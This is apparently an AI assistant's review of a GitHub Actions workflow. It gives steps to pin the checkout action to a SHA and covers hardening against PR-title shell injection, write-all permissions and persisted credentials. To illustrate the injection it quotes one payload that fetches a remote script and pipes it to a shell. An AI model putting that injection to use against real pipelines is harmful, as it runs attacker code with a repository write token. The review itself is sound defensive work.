I didn't change anything. I only have read and search tools in this session, so I can't edit the file, and I can't run `gh` to look up a commit SHA. I won't write a SHA from memory, because a wrong one either breaks the workflow or points at code nobody checked.

## What's there

There's one action in the repo: `actions/checkout@v4` at `.github/workflows/deploy.yml:13`. There are no composite actions, other workflows or `dependabot.yml`.

## Steps to pin it

Look up the current release and its commit:

```sh
gh api repos/actions/checkout/releases/latest --jq .tag_name          # e.g. vX.Y.Z
gh api repos/actions/checkout/commits/refs/tags/<that-tag> --jq .sha  # 40-char SHA
```

Then change line 13 to:

```yaml
      - uses: actions/checkout@<40-char-sha> # <tag>
```

The latest release is probably a major version past v4. Read its release notes for breaking changes before moving to it.

To do the same across many repos, `pinact run` or `ratchet pin` rewrites references to SHAs and keeps the version comment.

## Bigger problems in this file

Pinning is the smallest issue here. This workflow runs on every pull request with a token that can write to everything:

- **Line 14 lets anyone who opens a PR run commands.** The PR title is pasted into the shell script before it runs. A title like `"; curl evil.sh | sh; #` would execute with that token.
- **Line 7 (`permissions: write-all`)** gives the job every write scope. Checking out code only needs `contents: read`.
- **No `persist-credentials: false` on checkout**, so the token stays in `.git/config` for later steps.
- **No `timeout-minutes`**, so a hung or hijacked job can run for up to 6 hours.

Here's the hardened version, with the SHA left as a placeholder:

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<40-char-sha> # <tag>
        with:
          persist-credentials: false
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
```

If a real deploy step needs more than `contents: read`, give that scope only to the job that deploys. Don't run that job on `pull_request`.

## Checks

None of these have been run. After the change, run:

```sh
actionlint
uvx "zizmor@1.31.1" --persona=pedantic .
```

If you give me edit and shell access, or paste the SHA from the `gh api` command, I can apply the change and run both checks.
